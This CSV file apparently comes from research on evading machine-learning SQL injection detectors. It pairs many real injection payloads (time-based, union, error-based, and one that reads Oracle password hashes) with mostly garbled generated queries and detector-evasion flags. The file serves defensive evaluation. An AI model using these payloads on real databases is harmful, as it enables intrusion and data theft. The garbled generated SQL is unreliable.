original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1   )    )    as wufr where 5239  =  5239 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","SELECT * FROM SQL_injection WHERE ""5239 = 5239"" OR domain.domain.tables = ""t2, domain.tables as t3 )""",0,1,1,0,0,0,0
"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",SELECT 'evade SQL injection detection' FROM SQL SELECT MIN(sqpe) FROM SQL,1,0,1,1,1,1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT DISTINCT vwyq FROM SQL injection,1,0,1,1,1,1,1
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
1%'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',SELECT MIN(4386 = 4386) FROM SQL_inaddr.get_host_address WHERE NOT chr = 4386 AND 'utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr (113 ) ||chr ( 4386 ='sql injection',0,1,0,0,1,0,0
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"1%""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""%""  =  ""","SELECT DISTINCT elt ( 4249 = 4249 = 4249 = 4249 = 7259 ////// FROM SQL injection_description WHERE NOT elt = ""elt ( 4249 = 4249 = 4249 = 4249 = 4249 = 4249 = 7259 ) AND ((((((((%) = 'evade SQL injection detection')",1,1,0,0,0,0,0
"-8040""   )    )     )   or make_set  (  3916  =  6787,6787  )   and    (    (     (  ""laar"" like ""laar","SELECT DISTINCT ( ( ( ( (SELECT MIN(3916 = 6787,6787) FROM SQL injection) ORDER BY MIN(3916 = 6787,6787)",1,1,0,0,0,0,0
1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,SELECT MIN(sqt) FROM SQL injection,1,0,1,1,1,1,1
"1'||  (  select 'txyy' where 6500  =  6500 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'","SELECT txyy FROM SQL JOIN (SELECT txyy, MIN(sql) FROM SQL JOIN Query: 1'||) AS t2 ON t1.excat = t2.excat_0, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c, 0x5c,'sq injection') ='sql injection')",0,1,0,0,0,0,0
"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub","SELECT MIN(sequence) FROM SQL injection, SELECT MIN(sequence) FROM SQL_injection) FROM SQL_injection",1,0,1,1,1,1,1
"1"" where 9792  =  9792 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
"-9774'   )    )     )   union all select 6954,6954,6954#","SELECT 6954,6954# FROM SQL injection AS :_6954 WHERE NOT SELECT 6954,6954# FROM SQL_Injections",1,1,1,1,0,1,0
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",SELECT MIN(sql) FROM SQL injection JOIN (SELECT SUM(SQL) FROM SQL),0,0,1,1,1,1,1
1  )   and 9198  =  9198--,"SELECT * FROM query: 1 INTERSECT SELECT * FROM query: 9198-- for: 'excelted' FROM query: 1 - SELECT * FROM query: 9198-- for' AND NOT SQL_injection = ""valid""",1,1,1,0,1,1,0
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq,SELECT MIN(SQQ) FROM SQL Injection),1,0,1,1,1,1,1
')))) waitfor delay '0:0:20' --,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","SELECT MIN(5000000, md5 ( 0x694a4745 ) FROM SQL_Injections WHERE 8781 = 8781 OR 8781 = 8781 OR 8466 = benchmark (5000000,md5 ( 0x694a4745 )",1,1,0,0,0,0,0
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--","SELECT MIN(USER()) FROM SQL, SELECT SELECT FROM SQL, SELECT SELECT FROM SQL,SELECT SUM(USER()) FROM SQL JOIN SELECT @@VERSION,USER(), SELECT SUM(USER()) FROM SQL JOIN SELECT SELECT SUM(USER()) FROM SQL",0,1,1,0,1,1,0
"UNION ALL SELECT 1,2,3,4--","SELECT MIN(2,3,4--) FROM SQL injection",1,0,1,0,0,0,0
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,SELECT DISTINCT esq_injection FROM SQL SELECT esq_injection_detection FROM SQL,1,0,1,1,1,1,1
"',NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",SELECT MIN(%20delay%20'0:0:20'%20/*) FROM SQL injection,1,1,0,0,0,0,0
1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',SELECT MIN(sqlid_to_sqlhash) FROM SQL injection,1,0,1,1,1,1,1
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",SELECT MIN(*) FROM SQL_injection WHERE 'evade SQL injection' = '5105 = 5105' OR SELECT MIN(SELECT MIN(*) FROM generate_series WHERE NOT SELECT 'votg' FROM SQL_injection',0,1,0,0,1,0,0
"1%' and elt  (  4249  =  4249,7259  )   and '%'  =  '",SELECT MIN(4249 = 4249 = 4249 = 7259 ) FROM SQL injection,1,1,0,0,0,0,0
"-3729'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'czed'  =  'czed",SELECT MIN(5023 ='sql injection') FROM SQL -3729',0,1,1,0,1,1,0
or 1  =  1 or ''  =  ',SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
ORDER BY 4--,SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT ORDER BY 4--,1,0,1,1,1,1,1
"-2071 union all select 4753,4753--","SELECT MIN(SQL) FROM SQL - MIN(SQL) FROM Query: -2071 union All select 4753,4753--",1,1,1,1,0,1,0
26%,"SELECT * FROM query: 26% WHERE NOT SQL_injection = ""valid""",1,0,0,0,1,0,0
1'   )    )    and sleep  (  5  )  #,SELECT MIN(5 ) FROM SQL injection,1,1,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
1'||  (  select 'gmkp' where 6016  =  6016,SELECT 'evade sq injection detection' FROM SQL SELECT MIN(6016 = 6016) FROM SQL,1,1,0,1,1,1,0
"1',  (  case when 3598  =  2118 then 1 else null end  )  ",SELECT MIN(case) FROM SQL injection detection,0,0,1,1,1,1,1
"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",SELECT MIN(sleep) FROM SQL injection_detect WHERE 4940 = 4940 OR elt = 4940 OR 5873 = 5873 ORDER BY leep,1,1,0,0,0,0,0
-7532   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8332  =  8332,SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ORDER BY 8332,0,1,1,1,1,1,1
SELECT COUNT(*) FROM game;,"SELECT query: SELECT COUNT(*) FROM game;sql = ""sq injection"" AND NOT SELECT FROM query: SELECT COUNT(*) FROM game;",1,0,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"UNION ALL SELECT 1,2,3","SELECT MIN(1,2,3 FROM SQL injection detection",1,0,1,1,1,1,1
-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,SELECT MIN(sql injection) FROM SQL_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr. 113 ) ORDER BY _sql_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.,0,0,1,1,1,1,1
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
1'||  (  select 'ifts' from dual where 6329  =  6329,SELECT 'evade sq injection detection' FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1  )   as zhvx where 3171  =  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","SELECT MIN(extractionvalue) FROM SQL, SELECT MIN(extractionvalue) FROM zhvx WHERE NOT zhvx = 3171 = 3171 AND NOT 0x7171706a71 = 1",1,1,0,0,1,0,0
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod",SELECT MIN(500000000000/2 ) FROM SQL injection_description,1,0,1,1,1,1,1
"-9656"" union all select 8735,8735--","SELECT 8735,8735-- FROM SQL injection AS :_executive FROM 8735,8735--",1,1,1,1,0,1,0
"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255","SELECT * FROM SQL_injection, COUNT(*) FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_Injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 ) AND (((((((((SELECT MIN(*) FROM SQL_injection) FROM SELECT SELECT SELECT SUM((SELECT SUM(*) FROM SQL / SUM(sysusers as sysusers as sys4,sysusers as sys7 - sysusers as sys1,sysusers as sys1,sysusers as sys7 - sysusers as sys7) FROM SQL INNER SELECT, COUNT(*)",1,1,0,0,0,0,0
"1%'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7  (SELECT MIN(*) FROM SQL_INjection))",0,1,0,0,0,0,0
1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,SELECT MIN(sequence) FROM SQL injection,1,0,1,1,1,1,1
-8836%'  )   or 4856  =  3891,SELECT MIN(sql injection) FROM SQL SELECT - swift FROM SELECT - 4856 = 3891,1,0,1,1,1,1,1
"1"" or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""snht""  =  ""snht","SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL_injection WHERE NOT sysusers = ""sys1,sysusers as sys1,sysusers as sys4,sysusers as snht = ""snht""",1,1,0,0,0,0,0
"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",SELECT MIN(1808 = 9474) FROM SQL_Injection,1,0,0,1,1,1,0
"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*","SELECT (SELECT NULL, NULL) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM SQL, SELECT NULL FROM query: +if(dull) FROM query: +if(benchmark(3000000,MD5(1)) FROM SELECT NULL, NULL FROM SELECT NULL, NULL FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM query: +if(dull) FROM SELECT NULL, NULL, NULL FROM Query: +if(dull) FROM Query: +if(dull) FROM SELECT NULL, NULL FROM SELECT NULL, NULL FROM query: +if(dull) FROM Query: +if(dull) FROM Query: +if",1,1,0,0,1,0,0
"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",SELECT MIN(500000000/2 ) FROM SQL_Injection WHERE NOT SELECT 'evade SQL injection detection' AND NOT hex ( randomblob ( 500000000000/2 ) = '8148 = like (SELECT MIN(500000000000/2 ) FROM SQL),0,1,0,0,1,0,0
1%'   )    )    union all select null#,SELECT NOT SELECT DISTINCT null# FROM SQL injection,1,0,1,1,1,1,1
SELECT * FROM Customers ORDER BY Country;,SELECT * FROM Customers ORDER BY Country,1,0,1,1,1,1,1
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ","SELECT MIN(7982,concat) FROM SQL_injection",1,0,1,1,1,1,1
1'||  (  select 'oxas' from dual where 8284  =  8284 or sleep  (  5   )    )   ||',SELECT 'oxas' FROM SQL injection',1,0,1,1,1,1,1
ORDER BY 8#,"SELECT * FROM query: SELECT query: SELECT query: SELECT query FROM 8# WHERE NOT SQL_inject = ""valid""",1,0,1,1,1,1,1
INSERT INTO table,"SELECT * FROM table WHERE NOT SELECT SELECT * FROM table_name = ""sql injection"" AND NOT SELECT * FROM table_name",1,0,1,1,1,1,1
1'  )   as syer where 3141  =  3141 rlike   (  select   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,SELECT MIN(0 AS _x28_end) FROM SQL injection,1,0,1,1,1,1,1
1'||  (  select 'pxkz' where 2207  =  2207 and   (  3020  =  3020  )  *6703  )  ||',SELECT DISTINCT pxkz FROM SQL JOIN 2207 = 2207 AND 3020 = 3020,0,1,1,1,0,1,0
' union all select @@version--,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i","SELECT MIN(SELECT) FROM SYS.USER$, SELECT FROM SELECT SELECT SELECT MIN(SELECT) FROM SYS.USER$",0,1,1,1,1,1,1
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--","SELECT (SELECT MAX(3000000,MD5(1)) FROM SQL AS T1 JOIN SELECT * FROM Query WHERE NOT SQL_injection = ""valid"" ORDER BY query",0,1,0,0,1,0,0
"1%""  )   rlike   (  select   (  case when   (  7736  =  7642  )   then 1 else 0x28 end   )    )    and   (  ""%""  =  """,SELECT MIN(sql injection) FROM SQL_injection,1,0,1,1,1,1,1
"-2028%'   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  '",SELECT DISTINCT -'sql injection' FROM SQL_injection',0,0,1,1,0,1,0
"-9751""   )    )     )   or 5929  =  3884--",SELECT MIN(3884--) FROM SQL injection AS _evade_sq_injection FROM SQL_injection,1,1,1,1,1,1,1
"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  ""","SELECT MIN(""%"") FROM SQL injection detection",1,0,0,0,1,0,0
"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""sdvu"" like ""sdvu","SELECT MIN(sdvu) FROM SQL injection, SELECT MIN(sdvu) FROM SQL - evade SQL injection detection",1,1,0,1,1,1,0
"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",SELECT sfuq FROM SELECT sfuq FROM SELECT MIN(8094 = 8094) FROM SQL SELECT sfuq FROM SELECT MIN(8094 = 8094),1,1,0,0,1,0,0
"1   )    )    as jyfo where 8121  =  8121 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",SELECT * FROM SQL_injection WHERE esq = 'evadesq injection' AND NOT idb$types = '881 = 8121' AND 9254 = (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(succt_functions) FROM SQL_injection) as t1 WHERE t1.esql injection' = 'esq injection'),1,1,0,0,1,0,0
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--",SELECT DISTINCT eude_sq_injection FROM SQL_injection,1,0,1,1,1,1,1
"1%'  )   union all select null,null,null,null,null,null,null,null,null#",SELECT MIN(sql) FROM SQL injection,1,0,1,1,1,1,1
"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--","SELECT MIN(sql injection) FROM SQL_injection WHERE 8533 = 8533 AND union = 8533 JOIN 8533,8533,8533--""",1,1,1,0,0,0,0
"-9535"" order by 1--",SELECT MIN(1 - 9535) FROM SQL injection detection,1,0,1,1,1,1,1
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",SELECT * FROM SQL_injection WHERE NOT rdb$types ='sql injection' AND 6414 ='sql injection',1,1,0,0,0,0,0
"1 where 5081  =  5081 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",SELECT NOT (SELECT SUM(Null) FROM SQL_Inject) FROM query WHERE 5081 = 5081 ORDER BY char( 68 ),1,1,0,0,1,0,0
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl","SELECT MIN(*) FROM SQL injection, SELECT MIN(*) FROM SQL_injection) FROM SQL",1,0,1,0,1,1,0
"1%' union all select null,null,null,null,null,null,null--","SELECT MIN(null),null,null,null,null,null,null,null,null,null,null,null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL",1,1,1,0,0,0,0
"1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '","SELECT MIN(excat) FROM SQL, SELECT 0x5c, MIN(excat) FROM SQL injection",1,1,1,1,1,1,1
1   )    )    and 2006  =  2006,SELECT * FROM SQL ORDER BY NOT SQL_injection,1,0,1,1,1,1,1
""" or sleep(__TIME__)=""","SELECT MIN(__TIME__) FROM SQL injection AS t1 JOIN Query: ""SQL injection detection"" FROM SQL SELECT SELECT MIN(__TIME__) FROM SQL",0,0,1,1,1,1,1
"-8073   )    )     )   union all select 4481,4481,4481,4481--","SELECT 4481,4481,4481-- FROM SQL_Injection WHERE NOT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL_Injection",1,1,1,1,1,1,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""  =  ""","SELECT * FROM SQL_injection WHERE NOT domain.domain.columns = ""t1, domain.domain.tables"" AND ""%"" = ""evade""",1,1,0,0,0,0,0
"-9379  )   or make_set  (  9354  =  9354,7185  )   and   (  9212  =  9212",SELECT MIN(992 = 9212 FROM SQL AS T1 JOIN -9379 AS T2 ON T1.9354 = T2.9354 = T2.9354 = T2.9354 = 9212,1,1,1,1,0,1,0
1' rlike   (  select   (  case when   (  6855  =  1056  )   then 1 else 0x28 end   )    )    and 'pmrz' like 'pmrz,SELECT MIN(sql injection) FROM SQL injection,1,0,1,1,1,1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'rfgj' like 'rfgj","SELECT MIN(3702 ) FROM SQL injection, SELECT rfgj FROM 'evade SQL injection detection'",1,0,1,1,1,1,1
"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","SELECT SUM(*) FROM SQL_injection WHERE NOT all_users = ""evade""",1,0,0,0,1,0,0
" select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",SELECT MIN(1) FROM SQL injection detection,1,1,1,0,1,1,0
1  )   union all select null#,SELECT NOT SELECT DISTINCT null# FROM SQL injection,1,0,1,1,1,1,1
1'   )    )     )   and 5615  =  5458--,SELECT MIN(5458 - -) FROM SQL injection,1,1,1,1,1,1,1
ORDER BY 24--,"SELECT * FROM query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT query: SELECT SQL FROM 24-- ORDER BY ""valid"" FROM query: ORDER BY 24",1,0,1,1,1,1,1
"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #","SELECT MIN(0x7171706a71, 0x7171706a71, 0x717a71, 0x717a7, Delete SQL_injection FROM SQL_injection WHERE NOT ix7171706a71 = ""Excel""",1,1,1,1,1,1,1
"1%"" and elt  (  5345  =  8751,8751  )   and ""%""  =  ""","SELECT MIN(5345 = 8751,8751 ) FROM SQL injection",1,1,1,1,0,1,0
",NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",SELECT MIN(%20delay%20delay%20'0:0:20'%20--) FROM SQL injection,1,1,0,0,0,0,0
"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#","SELECT MIN(SQL injection) FROM SQL_Injection WHERE NOT STRFTIME('%y',3432,3432#) = '3432,3432'",1,1,0,0,0,0,0
1'||  (  select 'tzxr' from dual where 2934  =  2934 and 4595  =  4595#,"SELECT tzxr FROM SQL JOIN Query: 1'|| (SELECT SELECT tzxr FROM SQL SELECT tzxr FROM SQL JOIN 1'||"" FROM SQL SELECT SELECT tzxr FROM SQL JOIN 1'||"" FROM Query: 1'||"" AND NOT tzxr = ""eluded""",0,1,1,0,1,1,0
' or 2 between 1 and 3,SELECT MIN(1 - 3) FROM SQL injection detection,1,0,1,1,1,1,1
